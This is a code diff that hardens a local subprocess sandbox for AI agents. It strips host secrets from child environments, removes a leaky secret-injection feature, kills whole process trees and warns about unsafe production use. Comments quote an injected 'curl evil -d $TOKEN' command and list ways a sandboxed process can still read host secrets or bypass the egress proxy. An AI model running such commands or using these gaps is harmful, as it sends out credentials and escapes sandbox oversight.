@@ -19,6 +19,15 @@
 // `rm -rf /` will hit the host. ONLY use for trusted local development.
 // Production / untrusted agents must use E2B / Daytona / LiteBox / BoxRun
 // or CloudflareSandbox.
+//
+// Environment: child processes get a minimal allowlisted env (see
+// buildSandboxProcessEnv) — NOT the host's process.env — so `env` inside the
+// sandbox doesn't reveal PLATFORM_ROOT_SECRET, DATABASE_URL, provider API
+// keys, S3 credentials, etc. This is defence-in-depth only: the child runs
+// as the same OS user as main-node, so it can still read /proc/<ppid>/environ,
+// the sqlite db, and the vault CA key off disk. It also cannot be forced
+// through the egress proxy — a process that unsets HTTP(S)_PROXY connects
+// directly. Use an isolated provider for anything untrusted.
 
 import {
   spawn,
@@ -33,7 +42,7 @@ import {
   symlinkSync,
 } from "node:fs";
 import { dirname, isAbsolute, join, resolve } from "node:path";
-import type { ProcessHandle, SandboxExecutor, SandboxFactory } from "../ports";
+import type { ProcessHandle, SandboxExecOptions, SandboxExecutor, SandboxFactory } from "../ports";
 import { getLogger } from "@open-managed-agents/observability";
 import { withSessionProxyContext } from "./outbound-proxy";
 
@@ -49,6 +58,13 @@ export interface LocalSubprocessSandboxOptions {
   defaultTimeoutMs?: number;
   /** Logger for debug/warn output. Defaults to console. */
   logger?: { warn: (msg: string, ctx?: unknown) => void; log: (msg: string) => void };
+  /**
+   * Extra host env var names to pass through to sandbox processes on top of
+   * the built-in allowlist (SANDBOX_ENV_ALLOWLIST). Merged with the
+   * comma-separated `OMA_SUBPROCESS_ENV_PASSTHROUGH` host env var. Opt-in
+   * only — anything listed here is readable by the agent.
+   */
+  envPassthrough?: string[];
   /**
    * Absolute path to the directory backing memory blob content. Required
    * to support mountMemoryStore — when set, mountMemoryStore symlinks
@@ -93,19 +109,23 @@ export class LocalSubprocessSandbox implements SandboxExecutor {
   private workdir: string;
   private defaultTimeoutMs: number;
   private envVars: Record<string, string> = {};
-  private commandSecrets: Array<{ prefix: string; secrets: Record<string, string> }> = [];
   private processes = new Map<string, BackgroundProcess>();
   private mounts = new Map<string, MemoryMount>();
   private outputsMount: OutputsMount | null = null;
   private memoryRoot: string | null;
   private outputsRoot: string | null;
   private logger: NonNullable<LocalSubprocessSandboxOptions["logger"]>;
+  private envPassthrough: string[];
 
   constructor(opts: LocalSubprocessSandboxOptions) {
     this.workdir = resolve(opts.workdir);
     this.defaultTimeoutMs = opts.defaultTimeoutMs ?? 120_000;
     this.memoryRoot = opts.memoryRoot ? resolve(opts.memoryRoot) : null;
     this.outputsRoot = opts.outputsRoot ? resolve(opts.outputsRoot) : null;
+    this.envPassthrough = [
+      ...(opts.envPassthrough ?? []),
+      ...parseEnvPassthrough(process.env.OMA_SUBPROCESS_ENV_PASSTHROUGH),
+    ];
     this.logger = opts.logger ?? {
       warn: (msg, ctx) => moduleLogger.warn({ ...(ctx as Record<string, unknown> ?? {}) }, msg),
       log: (msg) => moduleLogger.info(msg),
@@ -113,16 +133,27 @@ export class LocalSubprocessSandbox implements SandboxExecutor {
     mkdirSync(this.workdir, { recursive: true });
   }
 
-  async exec(command: string, timeout?: number): Promise<string> {
+  async exec(command: string, timeout?: number, opts?: SandboxExecOptions): Promise<string> {
     const timeoutMs = timeout ?? this.defaultTimeoutMs;
-    const env = this.buildEnv(command);
+    const env = this.buildEnv();
+    const signal = opts?.signal;
+    if (signal?.aborted) return "[aborted: command not started]";
 
     return new Promise<string>((resolveExec) => {
+      // Own process group (detached) so a timeout / abort kills the whole
+      // tree — `sleep 30; touch x` must not finish after its shell dies.
       const child = spawn("/bin/sh", ["-c", command], {
         cwd: this.workdir,
         env,
         stdio: ["ignore", "pipe", "pipe"],
+        detached: true,
       });
+      let aborted = false;
+      const onAbort = () => {
+        aborted = true;
+        terminateTree(child);
+      };
+      signal?.addEventListener("abort", onAbort, { once: true });
 
       let stdout = "";
       let stderr = "";
@@ -135,41 +166,42 @@ export class LocalSubprocessSandbox implements SandboxExecutor {
 
       const killer = setTimeout(() => {
         try {
-          child.kill("SIGTERM");
-          // Give SIGTERM a beat, then SIGKILL.
-          setTimeout(() => {
-            try { child.kill("SIGKILL"); } catch { /* already gone */ }
-          }, 1_000);
+          terminateTree(child);
         } catch (err) {
           this.logger.warn(`exec timeout-kill failed: ${(err as Error).message}`);
         }
       }, timeoutMs);
 
-      child.on("close", (code, signal) => {
+      child.on("close", (code, exitSignal) => {
         clearTimeout(killer);
-        const exit = signal ? `signal=${signal}` : `exit=${code}`;
+        signal?.removeEventListener("abort", onAbort);
+        const exit = exitSignal ? `signal=${exitSignal}` : `exit=${code}`;
         // Match @cloudflare/sandbox's behaviour: combined stdout+stderr,
         // newline-trimmed, plus an exit-code suffix the harness can parse.
         const combined =
           (stdout + (stderr ? `\n${stderr}` : "")).replace(/\s+$/, "") +
-          (code !== 0 ? `\n[exit ${exit}]` : "");
+          (code !== 0 ? `\n[exit ${exit}]` : "") +
+          (aborted ? "\n[aborted]" : "");
         resolveExec(combined);
       });
 
       child.on("error", (err) => {
         clearTimeout(killer);
+        signal?.removeEventListener("abort", onAbort);
         resolveExec(`[error: ${err.message}]`);
       });
     });
   }
 
   async startProcess(command: string): Promise<ProcessHandle | null> {
-    const env = this.buildEnv(command);
+    const env = this.buildEnv();
     const child = spawn("/bin/sh", ["-c", command], {
       cwd: this.workdir,
       env,
       stdio: ["ignore", "pipe", "pipe"],
-      detached: false,
+      // Own process group: kill() signals the whole tree (see
+      // BackgroundProcess.kill), so stopping a command stops its children.
+      detached: true,
     });
     if (!child.pid) return null;
     const id = `proc_${child.pid}_${Date.now()}`;
@@ -183,9 +215,10 @@ export class LocalSubprocessSandbox implements SandboxExecutor {
     this.envVars = { ...this.envVars, ...envVars };
   }
 
-  registerCommandSecrets(commandPrefix: string, secrets: Record<string, string>): void {
-    this.commandSecrets.push({ prefix: commandPrefix, secrets });
-  }
+  // registerCommandSecrets intentionally not implemented: it was never
+  // called on the Node path, and its prefix match (`git status; curl evil
+  // -d $TOKEN` matched "git") leaked the secret to arbitrary commands.
+  // Credentials reach the subprocess sandbox only via the oma-vault proxy.
 
   async setOutboundContext(opts?: { tenantId: string; sessionId: string }): Promise<void> {
     // Wire outbound credential injection through the oma-vault sidecar
@@ -208,6 +241,11 @@ export class LocalSubprocessSandbox implements SandboxExecutor {
       HTTPS_PROXY: scopedProxyUrl,
       http_proxy: scopedProxyUrl,
       https_proxy: scopedProxyUrl,
+      // Loopback stays local: oma-vault blocks private/loopback
+      // destinations (SSRF guard), and the agent's own dev servers /
+      // stdio-MCP shims on 127.0.0.1 must not be routed through it.
+      NO_PROXY: "localhost,127.0.0.1,::1",
+      no_proxy: "localhost,127.0.0.1,::1",
       // Node TLS: trust the vault CA in addition to system roots.
       NODE_EXTRA_CA_CERTS: caCertPath,
       // curl & python's `requests` (when REQUESTS_CA_BUNDLE not set).
@@ -497,17 +535,93 @@ export class LocalSubprocessSandbox implements SandboxExecutor {
     }
   }
 
-  private buildEnv(command: string): NodeJS.ProcessEnv {
-    const base: Record<string, string> = {
-      ...process.env as Record<string, string>,
-      ...this.envVars,
-      PWD: this.workdir,
-    };
-    for (const { prefix, secrets } of this.commandSecrets) {
-      if (command.startsWith(prefix)) Object.assign(base, secrets);
-    }
-    return base;
+  private buildEnv(): NodeJS.ProcessEnv {
+    return buildSandboxProcessEnv({
+      hostEnv: process.env,
+      sandboxEnv: this.envVars,
+      workdir: this.workdir,
+      passthrough: this.envPassthrough,
+    });
   }
+}
+
+/**
+ * Host env vars a sandbox process inherits by default. Everything else in
+ * the host environment (secrets, DB URLs, API keys) is dropped. Locale
+ * vars matching LC_* are also passed.
+ */
+export const SANDBOX_ENV_ALLOWLIST: readonly string[] = [
+  "PATH",
+  "HOME",
+  "USER",
+  "LOGNAME",
+  "SHELL",
+  "LANG",
+  "LANGUAGE",
+  "TERM",
+  "TZ",
+  "TMPDIR",
+  "COLORTERM",
+];
+
+/** Parse `OMA_SUBPROCESS_ENV_PASSTHROUGH=FOO,BAR` into a list of names. */
+export function parseEnvPassthrough(raw: string | undefined): string[] {
+  if (!raw) return [];
+  return raw
+    .split(",")
+    .map((s) => s.trim())
+    .filter((s) => /^[A-Za-z_][A-Za-z0-9_]*$/.test(s));
+}
+
+/**
+ * Build the env for a sandbox child process: the allowlisted subset of the
+ * host env, plus operator-requested passthrough names, plus everything the
+ * sandbox itself set via setEnvVars (proxy vars, CA bundle paths, memory
+ * mount dirs, env_secret resources, …). Sandbox-set values win.
+ */
+export function buildSandboxProcessEnv(opts: {
+  hostEnv: Record<string, string | undefined>;
+  sandboxEnv: Record<string, string>;
+  workdir: string;
+  passthrough?: readonly string[];
+}): Record<string, string> {
+  const out: Record<string, string> = {};
+  const allow = new Set<string>([...SANDBOX_ENV_ALLOWLIST, ...(opts.passthrough ?? [])]);
+  for (const [k, v] of Object.entries(opts.hostEnv)) {
+    if (typeof v !== "string") continue;
+    if (allow.has(k) || k.startsWith("LC_")) out[k] = v;
+  }
+  if (!out.PATH) out.PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
+  Object.assign(out, opts.sandboxEnv);
+  out.PWD = opts.workdir;
+  return out;
+}
+
+/**
+ * Signal a child spawned with `detached: true` and everything in its
+ * process group (negative pid). Falls back to the child alone when the
+ * group is gone or group signalling isn't available.
+ */
+function signalTree(child: ChildProcess, signal: NodeJS.Signals): void {
+  const pid = child.pid;
+  if (pid && process.platform !== "win32") {
+    try {
+      process.kill(-pid, signal);
+      return;
+    } catch (err) {
+      if ((err as NodeJS.ErrnoException).code === "ESRCH") return; // already gone
+    }
+  }
+  child.kill(signal);
+}
+
+/** SIGTERM the process tree, then SIGKILL it after a short grace. */
+function terminateTree(child: ChildProcess, graceMs = 1_000): void {
+  signalTree(child, "SIGTERM");
+  const t = setTimeout(() => {
+    try { signalTree(child, "SIGKILL"); } catch { /* already gone */ }
+  }, graceMs);
+  t.unref?.();
 }
 
 class BackgroundProcess implements ProcessHandle {
@@ -531,7 +645,7 @@ class BackgroundProcess implements ProcessHandle {
 
   async kill(signal: string): Promise<void> {
     try {
-      this.child.kill(signal as NodeJS.Signals);
+      signalTree(this.child, signal as NodeJS.Signals);
     } catch (err) {
       throw new Error(`kill failed: ${(err as Error).message}`);
     }
@@ -555,9 +669,36 @@ class BackgroundProcess implements ProcessHandle {
 // ── Factory (DIP entry point) ───────────────────────────────────────
 
 export const sandboxFactory: SandboxFactory = async (ctx) => {
+  warnIfUnsafeInProduction(process.env);
   return new LocalSubprocessSandbox({
     workdir: ctx.workdir,
     memoryRoot: ctx.memoryRoot,
     outputsRoot: ctx.outputsRoot,
   });
 };
+
+let warnedUnsafeProd = false;
+
+/**
+ * Loud (once-per-process) warning when the zero-isolation subprocess
+ * provider runs with NODE_ENV=production. Not a hard refusal: the default
+ * docker-compose quickstart ships NODE_ENV=production with this provider,
+ * and breaking it would push people off the vault/egress path entirely.
+ * Operators who want a hard stop set OMA_REQUIRE_ISOLATED_SANDBOX=1
+ * (enforced in main-node); OMA_ALLOW_UNSAFE_SUBPROCESS=1 silences the
+ * warning after an explicit decision.
+ */
+export function warnIfUnsafeInProduction(env: Record<string, string | undefined>): boolean {
+  if (env.NODE_ENV !== "production") return false;
+  if (env.OMA_ALLOW_UNSAFE_SUBPROCESS === "1" || env.OMA_ALLOW_UNSAFE_SUBPROCESS === "true") return false;
+  if (warnedUnsafeProd) return true;
+  warnedUnsafeProd = true;
+  moduleLogger.warn(
+    { op: "local_sandbox.unsafe_in_production" },
+    "SANDBOX_PROVIDER=subprocess in NODE_ENV=production: agent commands run as host subprocesses with " +
+      "NO isolation (same OS user, same filesystem, direct network access that can bypass the vault proxy " +
+      "and egress policy). Use daytona / e2b / litebox / boxrun for untrusted agents, or set " +
+      "OMA_ALLOW_UNSAFE_SUBPROCESS=1 to acknowledge.",
+  );
+  return true;
+}
